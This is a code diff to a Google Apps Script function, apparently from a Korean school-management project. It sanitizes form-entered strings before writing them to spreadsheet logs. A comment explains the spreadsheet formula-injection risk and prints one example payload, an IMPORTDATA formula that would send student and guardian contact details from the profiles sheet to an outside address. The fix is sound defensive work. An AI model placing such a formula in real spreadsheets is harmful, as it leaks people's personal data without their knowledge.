@@ -176,8 +176,15 @@ function voiceSweep_(ss) {
         TB_VOICE_REASON, '시스템', ts, Utilities.formatDate(ts, tz, 'yyyy-MM'), '']);
     }
   });
-  if (vOut.length) vl.getRange(vl.getLastRow() + 1, 1, vOut.length, 6).setValues(vOut);
-  if (pOut.length) pl.getRange(pl.getLastRow() + 1, 1, pOut.length, 8).setValues(pOut);
+  /* [v9.159] 🛡 수식 인젝션 소독 — [v9.157]이 폼 직기입 7경로를 공용 통로로 막을 때 **이 함수만 남았다**
+   *   (하드닝 세션이 발견·인계 · 보드상 이 구역 편집권이 이 세션이라 넘어왔다).
+   *   위험의 실체: `mission`은 목소리 폼의 **학생·강사 손입력 문자열**이고, voice_log·point_logs는
+   *   `profiles`(학생·보호자 연락처)와 **같은 스프레드시트**다. `=`로 시작하면 시트가 스스로 평가해
+   *   `=IMPORTDATA("...?d="&TEXTJOIN(",",1,profiles!H2:H400))` 한 줄로 개인정보가 밖으로 나간다(클릭 불요).
+   *   pOut은 지금은 상수뿐이지만 함께 통과시킨다 — **같은 방어를 자리마다 판단해 얹으면 다음 자리가 빠진다.**
+   *   `행소독_`(Code.js)은 문자열만 소독하고 Date·number는 타입 보존한다(ts·포인트 숫자 안전). */
+  if (vOut.length) vl.getRange(vl.getLastRow() + 1, 1, vOut.length, 6).setValues(행소독_(vOut));
+  if (pOut.length) pl.getRange(pl.getLastRow() + 1, 1, pOut.length, 8).setValues(행소독_(pOut));
   notifyDroppedSids_('목소리폼', badSid); // [v9.67] 함수 안 런타임 호출 — 톱레벨 크로스파일 금지 규칙과 무관
   props.setProperty('목소리폼_포인터', String(last));
   if (vOut.length) adminMail('[SYNK] 🎙 새 목소리 ' + vOut.length + '건',
